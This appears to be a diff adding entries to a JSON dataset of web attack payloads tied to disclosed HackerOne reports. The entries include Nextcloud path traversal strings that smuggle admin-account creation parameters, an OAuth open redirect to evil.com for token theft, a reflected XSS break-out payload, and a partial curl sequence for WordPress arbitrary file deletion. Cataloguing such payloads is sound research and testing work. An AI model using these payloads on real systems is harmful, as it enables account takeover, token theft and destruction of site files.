@@ -23086,6 +23086,74 @@
     }
   },
   {
+    "id": "47cfc12a",
+    "class": "path-traversal",
+    "payload": "path=/.\\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\\..\\.owncloudsync.log",
+    "technique": "Directory traversal using backslashes and '..' in the 'path' parameter",
+    "param": "path",
+    "report": {
+      "id": 1741430,
+      "url": "https://hackerone.com/reports/1741430",
+      "title": "CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ",
+      "program": "Nextcloud",
+      "reporter": "lukasreschke",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-01-11"
+    }
+  },
+  {
+    "id": "735339ef",
+    "class": "path-traversal",
+    "payload": "nc://open/admin@pentest.cloud.wtf/.\\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\\..\\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users",
+    "technique": "Path traversal via the 'token' parameter to reach ocs/v1.php/cloud/users",
+    "param": "token",
+    "report": {
+      "id": 1741430,
+      "url": "https://hackerone.com/reports/1741430",
+      "title": "CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ",
+      "program": "Nextcloud",
+      "reporter": "lukasreschke",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-01-11"
+    }
+  },
+  {
+    "id": "97ab7a45",
+    "class": "path-traversal",
+    "payload": "?token=../../../../../../../ocs/v1.php/cloud/users",
+    "technique": "Path traversal using '../../..' in the 'token' query parameter",
+    "param": "token",
+    "report": {
+      "id": 1741430,
+      "url": "https://hackerone.com/reports/1741430",
+      "title": "CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ",
+      "program": "Nextcloud",
+      "reporter": "lukasreschke",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-01-11"
+    }
+  },
+  {
+    "id": "10e87c2c",
+    "class": "path-traversal",
+    "payload": ".\\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\\..\\.owncloudsync.log",
+    "technique": "Path traversal via the 'relPath' POST body parameter using backslashes and '..'",
+    "param": "relPath",
+    "report": {
+      "id": 1741430,
+      "url": "https://hackerone.com/reports/1741430",
+      "title": "CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ",
+      "program": "Nextcloud",
+      "reporter": "lukasreschke",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2023-01-11"
+    }
+  },
+  {
     "id": "70a00a7c",
     "class": "ssrf",
     "payload": "{\"imapHost\":\"target.com\",\"imapPort\":993,\"imapSslMode\":\"ssl\",\"imapUser\":\"redacted\",\"imapPassword\":\"redacter\",\"smtpHost\":\"127.0.0.1\",\"smtpPort\":8080,\"smtpSslMode\":\"none\",\"smtpUser\":\"xx\",\"smtpPassword\":\"xx\",\"accountName\":\"Test1\",\"emailAddress\":\"xxx@xxx.org\"}",
@@ -23644,6 +23712,23 @@
       "severity": "high",
       "bounty": null,
       "disclosed_at": "2024-09-20"
+    }
+  },
+  {
+    "id": "c9992da1",
+    "class": "open-redirect",
+    "payload": "https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter",
+    "technique": "Open redirect by supplying an unvalidated 'redirect_uri' parameter",
+    "param": "redirect_uri",
+    "report": {
+      "id": 1923672,
+      "url": "https://hackerone.com/reports/1923672",
+      "title": "Account takeover due to insufficient URL validation on RelayState parameter",
+      "program": "GitLab",
+      "reporter": "bull",
+      "severity": "medium",
+      "bounty": 2450.0,
+      "disclosed_at": "2023-05-30"
     }
   },
   {
@@ -25123,6 +25208,23 @@
       "severity": "low",
       "bounty": 200.0,
       "disclosed_at": "2025-03-13"
+    }
+  },
+  {
+    "id": "12e32880",
+    "class": "xss",
+    "payload": "video\");\nalert('Hacked by k0x');\nsetTimeout(()=>location.href='\u2588\u2588\u2588\u2588',5000);//",
+    "technique": "Reflected XSS payload breaking out of a JavaScript context via the 'video' parameter",
+    "param": "video",
+    "report": {
+      "id": 2736979,
+      "url": "https://hackerone.com/reports/2736979",
+      "title": "CSRF to XSS",
+      "program": "U.S. Dept Of Defense",
+      "reporter": "k0x",
+      "severity": "medium",
+      "bounty": null,
+      "disclosed_at": "2024-12-18"
     }
   },
   {
@@ -26954,6 +27056,23 @@
       "id": 3931771,
       "url": "https://hackerone.com/reports/3931771",
       "title": "Author \u2192 stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`",
+      "program": "WordPress",
+      "reporter": "jakubk",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-28"
+    }
+  },
+  {
+    "id": "7680439f",
+    "class": "path-traversal",
+    "payload": "AP=<author1 application password>\nB=http://localhost:8356\n\n# [1] Author uploads a real JPEG\ncurl -u \"author1:$AP\" -H \"Content-Disposition: attachment; filename=zap4.jpg\" \\\n     -H \"Content-Type: image/jpeg\" --data-binary @zap.jpg \\\n     -X POST \"$B/?rest_route=/wp/v2/media\"                       # 201, id=8\n\n# [2] Poison one sub-size filename with the name of the file to destroy\ncurl -u \"author1:$AP\" -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"sub_sizes\":[{\"image_size\":\"thumbnail\",\"fil",
+    "technique": "Arbitrary file write via WordPress media sub_sizes JSON 'file' field injection",
+    "param": "file",
+    "report": {
+      "id": 3931777,
+      "url": "https://hackerone.com/reports/3931777",
+      "title": "Author \u2192 arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`",
       "program": "WordPress",
       "reporter": "jakubk",
       "severity": "critical",
